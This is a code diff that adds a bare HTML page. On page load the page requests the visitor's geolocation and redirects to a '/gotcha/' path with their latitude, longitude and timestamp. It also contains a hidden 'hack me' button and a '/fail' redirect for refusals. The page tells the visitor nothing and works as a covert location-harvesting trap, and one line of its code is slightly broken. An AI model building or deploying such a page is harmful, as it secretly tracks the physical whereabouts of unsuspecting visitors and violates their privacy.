@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html>
+<body>
+  
+
+<button onclick="getLocation()" id="btn" style="opacity:0;">hack me</button>
+  <p id="demo"></p>
+  
+  <script>
+    var y=document.getElementById("demo")
+var x = document.getElementById("btn");
+//function getLocation() {
+if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(showPosition, fuck);
+  } else {
+    //TODO remove this later
+    y.text= "Geolocation is not supported by this browser.";
+  }
+//}
+function showPosition(position) {
+window.location="/gotcha/"+position.coords.latitude+"/"+position.coords.longitude+"/"+Date()
+}
+function fuck() {
+  window.location="/fail"
+}
+//getLocation()
+</script>
+</body>
+
+</html>
